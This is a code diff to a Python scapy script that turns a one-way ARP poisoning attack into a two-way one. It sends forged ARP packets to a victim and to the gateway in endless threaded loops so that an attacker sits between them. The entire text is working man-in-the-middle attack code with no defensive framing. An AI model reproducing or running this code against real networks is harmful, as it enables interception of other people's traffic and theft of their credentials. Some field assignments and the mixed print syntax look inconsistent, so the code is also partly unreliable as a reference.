@@ -1,10 +1,19 @@
 from scapy.all import *
 from netifaces import *
 import subprocess, shlex, re, threading
+from time import *
  
-def run():
+def run_vPoisoning():
 	while True:
-		send(poisoning)
+		send(vPoisoning, verbose = False)
+		print "Send Victim Poisoning Packet!! \n"
+		sleep(1)
+
+def run_gPoisoning():
+	while True:
+		send(gPoisoning, verbose = False)
+		print("Send Gateway Poisoning Packet!! \n")
+		sleep(1)
 
 
 str_ifconfig = subprocess.check_output(shlex.split('ifconfig'))
@@ -35,14 +44,22 @@ gatewayMAC = Gresult.hwsrc
 print "Gateway IP : "+gatewayIP
 print "Gateway MAC : "+gatewayMAC
 
-poisoning = ARP()
-poisoning.psrc = ifconfigIP[1]
-poisoning.pdst = victimIP
-poisoning.hwsrc = gatewayMAC
-poisoning.hwdst = victimMAC
+vPoisoning = ARP()
+vPoisoning.psrc = ifconfigIP[1]
+vPoisoning.pdst = victimIP
+vPoisoning.hwsrc = gatewayMAC
+vPoisoning.hwdst = victimMAC
 
-tread = threading.Thread(target=run)
+threading.Thread(target=run_vPoisoning).start()
 
-tread.start()
+gPoisoning = ARP()
+gPoisoning.psrc = ifconfigIP[1]
+gPoisoning.pdst = gatewayIP
+gPoisoning.hwsrc = victimMAC
+gPoisoning.hwdst = gatewayMAC
+
+threading.Thread(target=run_gPoisoning).start()
+
+
 
 
